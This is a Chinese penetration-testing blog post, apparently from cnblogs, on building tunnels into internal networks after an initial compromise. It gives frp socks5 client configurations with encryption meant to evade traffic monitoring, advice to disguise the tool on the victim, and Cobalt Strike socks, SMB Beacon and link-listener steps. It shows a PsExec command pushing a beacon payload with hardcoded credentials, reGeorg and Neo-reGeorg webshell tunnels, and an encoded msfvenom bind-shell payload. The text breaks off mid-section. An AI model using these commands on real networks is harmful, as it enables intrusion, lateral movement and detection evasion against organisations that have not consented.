---
title: 实战中内网穿透的打法 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18187739
source: 博客园 - 渗透测试中心
date: 2024-05-13
fetch_date: 2025-10-06T17:14:59.777373
---

# 实战中内网穿透的打法 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [实战中内网穿透的打法](https://www.cnblogs.com/backlion/p/18187739 "发布于 2024-05-12 13:42")

## 前言

在内网渗透时，一个WebShell或CobaltStrike、Metasploit上线等，只是开端，更多是要内网横向移动，扩大战果，打到核心区域。但后渗透的前提是需要搭建一条通向内网的“专属通道”，才能进一步攻击。可实战中因为网络环境不同，所利用的方式就不同。

以下为自我总结“实战中内网穿透的打法”思维导图：

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134201496-1780382476.png)

## 目标出网（socks代理）

这是实战中最愿意碰到的网络环境，目标机可以正常访问互联网，可直接在目标机挂socks代理或CobaltStrike上线，打通目标的内网通道。

**Frp（socks5）**

Frp服务端配置文件：

1 | [common]
2 | bind\_port = 8080

Frp客户端配置文件：

1 | [common]
2 | server\_addr = xx.xx.xx.xx
3 | server\_port = 8080
4 | #服务端口使用Web常见端口
5 |
6 | [socks5]
7 | type = tcp
8 | remote\_port = 8088
9 | plugin = socks5
10 | use\_encryption = true
11 | use\_compression = true
12 | #socks5口令
13 | #plugin\_user = SuperMan
14 | #plugin\_passwd = XpO2McWe6nj3

此处添加了加密压缩这两个功能，默认是不开启的，根据作者介绍，压缩算法使用的是 snappy。

use\_encryption = true 启用加密 [通信内容加密传输，有效防止流量被拦截]

use\_compression = true 启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]

**use\_encryption = true 、use\_compression = true 必须放在相关协议下面。**

frp客户端与配置文件传到目标机后，把程序名与配置文件进行修改，并放在系统相关文件夹中，做到隐蔽。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134202733-1307124500.png)

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134203670-2094206611.png)

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134204255-725553901.png)

**加密压缩的对比**

这是frp客户端配置文件中未使用encryption与compression功能，利用metasploit挂socks代理，扫描ms17\_010传输的数据包，明显可辨别出具体攻击行为。如果目标内网有”态势感知“、流量分析等安全设备，就会被监测到，导致权限丢失。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134205015-817056185.png)

使用encryption与compression功能后，虽攻击源地址同样会暴露，但传输的数据包却无法辨别，规避了内网中的安全监测设备。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134205882-1270973653.png)

**CobaltStrike (socks4a)**

到已控目标机的Beacon下将socks代理开启。

1 | beacon > socks 1024 #端口根据VPS实际情况进行设置

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134206742-1303778529.png)

菜单栏中的View > Proxy Pivots，复制代理连接到Metasploit中，或直接将socks4a挂在相关安全工具中。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134207715-2015895728.png)

**上线不出网机器**

这是link链接，只要主链路(出网机Beacon)掉线，均掉！

**SMB Beacon**

官方对SMB Beacon的介绍：SMB Beacon是使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽。

创建一个SMB的Listener (host与port可无视)，注意Listener选择，在session中选择route可达的主机派生会话。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134208849-655736604.png)

运行成功后，可以看到 ∞∞ 这个字符，这就是派生SMB Beacon的连接状态。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134209667-901525554.png)

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134210353-12480323.png)

可在主Beacon上用link host链接或unlink host断开。

1 | beacon> link 192.168.144.155
2 | beacon> unlink 192.168.144.155

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134211037-132998840.png)

**Link Listener**

在已上线的主机创建Listener。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134211928-517817209.png)

导出该类型Listener对应的可执行文件或dll等。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134212756-942516291.png)

选择刚建立的Listener。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134213577-342299124.png)

上传刚才生成的payload到当前已上线的目标机中，这里用[PsExec.exe](https://www.secshi.com/goto/ff7z) 工具 。(CobalStrike本身psexec功能不够强大)

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134214378-27620203.png)

在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。

1 | beacon> shell C:WINDOWSTempPsExec.exe -accepteula \192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:WINDOWSTempbeacon.exe

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134215238-1957285179.png)

1 | beacon> shell netstat -ano |findstr 4444

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134215956-1504058873.png)

**SSH Login**

1 | beacon> ssh 192.168.144.174:22 root admin
2 | beacon> ssh 192.168.144.203:22 root admin

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134216668-903606565.png)

在Linux目标机中查看网络连接状态，实际是与之前已上线的Windows主机建立的连接。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134217520-1183936029.png)

## 目标不出网（http代理）

目标机网络中可能有防火墙、网闸等，只允许http单向出，无法正常访问互联网，用上述socks方法是行不通的，只能用http代理进行渗透。

**reGeorg (socks5)**

1 | python reGeorgSocksProxy.py -u http://192.168.144.211/tunnel.aspx -l 0.0.0.0 -p 10080

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134218417-91446156.png)

利用metasploit挂reGeorg socks代理，扫描ms17\_010传输的数据包，明显可辨别攻击行为。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134219602-1128156753.png)

**Neo-reGeorg (加密)**

1 | python neoreg.py -k test@123 -l 0.0.0.0 -p 10081 -u http://192.168.144.211/neo-tunnel.aspx

使用Neo-reGeorg后，数据包已被加密传输。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134220742-378445843.png)

**冰蝎 (开socks5)**

冰蝎的数据包传输是加密的，本身也具备socks代理功能，但传输过程中存在丢包情况。这里同样是利用metasploit探测ms17\_010漏洞，结果显示不存在。当不设置代理探测时，实际漏洞是存在的。

虽然冰蝎的这种代理扫描方式不如reGeorg准确，但小线程的端口探测等是可行的，如 auxiliary/scanner/portscan/tcp。准确度更多是因某种探测或其他方式的数据包在传输过程中的多少而决定。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134221866-2073188842.png)

**reduh (单端口转发)**

当目标服务器中间件等服务版本较低，reGeorg或冰蝎马等无法正常解析，就需要换用其它的http代理脚本。这是某实战中遇到的环境：

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134223045-1724645033.png)

**这里以reduh为例，虽然只能对指定的端口进行转发 (不适用图形化连接操作)，但可以先利用msfvenom生成正向的shell payload，再结合reduh单端口转发，上线metasploit，最后利用socks4a模块开代理。**

下面把具体的流程走一遍：

1 | sudo msfvenom --platform windows -p windows/shell\_bind\_tcp lport=53 -e x86/shikata\_ga\_nai -i 5 -f exe -o x86shell.exe
2 |
3 | --platform       <platform>       指定payload的目标平台
4 | -e, --encoder    <encoder>        指定需要使用的编码器
5 | -i, --iterations <count>          指定payload的编码次数

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134224058-1798659542.png)

上传payload到目标服务器，并执行。

![](https://img2023.cnblogs.com/blog/1049983/202405/1049983-20240512134224983-451445716.png)

meta...